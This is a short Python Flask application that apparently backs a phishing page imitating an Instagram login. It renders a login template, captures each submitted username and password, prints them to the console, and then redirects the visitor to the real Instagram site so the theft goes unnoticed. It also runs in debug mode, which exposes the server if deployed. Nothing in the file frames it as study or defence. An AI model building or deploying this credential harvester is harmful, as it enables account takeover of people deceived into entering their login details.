from flask import Flask, request, redirect, render_template

app = Flask(__name__)


@app.route('/', methods=['POST', 'GET'])
def login():
    if request.method == 'POST':
        username = request.form["username"]
        password = request.form["password"]

        print(username)
        print(password)
        return redirect('https://www.instagram.com/')

    else:

        return render_template('login.html')


if __name__ == "__main__":
    app.run(debug=True)
